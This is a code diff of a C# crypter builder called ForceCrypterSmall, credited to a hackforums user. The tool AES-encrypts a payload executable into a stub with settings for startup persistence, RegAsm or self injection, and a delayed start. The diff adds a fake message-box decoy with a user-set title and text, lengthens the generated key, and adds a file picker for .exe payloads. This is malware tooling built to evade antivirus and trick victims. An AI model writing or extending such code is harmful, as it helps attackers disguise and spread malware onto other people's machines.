@@ -16,6 +16,8 @@ using Microsoft.Win32;
 using ForceCrypterSmall.Resources;
 using System.Globalization;
 using System.Security.Cryptography;
+using System.Net;
+
 //Copyright 2016
 //Made by mrmutt for hackforums uid=3005497
 //Please leave this note here
@@ -44,6 +46,7 @@ namespace ForceCrypterSmall
             }
             return tmp;
         }
+        
         private string RandomNumber(int _length)
         {
             //Making a random number for the random assemblys version
@@ -103,7 +106,7 @@ namespace ForceCrypterSmall
         private void nsRandomPool1_ValueChanged(object sender)
         {
             //Making a random key
-            txtEncryptionKey.Text = nsRandomPool1.Value + RandomString(200);
+            txtEncryptionKey.Text = nsRandomPool1.Value + RandomString(300);
         }
 
         private void btnRandomize_Click_1(object sender, EventArgs e)
@@ -183,7 +186,16 @@ namespace ForceCrypterSmall
                     //FileName
                     boop = boop.Replace("[finame-replace]", txtStartup.Text);
                 }
-                
+                if (cbMsgBox.Checked)
+                {
+                    boop = boop.Replace("[fakemessage-replace]", "true");
+                    boop = boop.Replace("[messagetitle-replace]", txtMsgTitle.Text);
+                    boop = boop.Replace("[messagetext-replace]", txtMsg.Text);
+                }
+                else
+                {
+                    boop = boop.Replace("[fakemessage-replace]", "false");
+                }
                 //Replacing the key in the stub with our encryption key
                 boop = boop.Replace("[key-replace]", txtEncryptionKey.Text);
                 //Reading the bytes from our payload
@@ -200,6 +212,7 @@ namespace ForceCrypterSmall
                 byte[] encBytes = Encboop.AESEncrypt(first, enckey);
                 //Injection methods               
                 if (rbItself.Checked)
+                
                     boop = boop.Replace("[inject-replace]", "[itself]");
                 if(rbRegAsm.Checked)
                     boop = boop.Replace("[inject-replace]", "[regasm]");
@@ -208,6 +221,7 @@ namespace ForceCrypterSmall
                 //Checking if user checked delay
                 if (cbDelay.Checked)
                 {
+                    
                     boop = boop.Replace("[delay-replace]", txtDelay.Text);
                 }
                 else
@@ -253,5 +267,26 @@ namespace ForceCrypterSmall
                 }
             }
 
+        private void nsButton1_Click(object sender, EventArgs e)
+        {
+
+            //Open file dialog to let the user select a file to scan
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                {
+                    ofd.Filter = "Payload|*.exe";
+                    txtScanFile.Text = ofd.FileName;
+                }
+
+            }
+
+        }
+
+        private void nsButton2_Click(object sender, EventArgs e)
+        {
+            
+
+        }
     }
 }
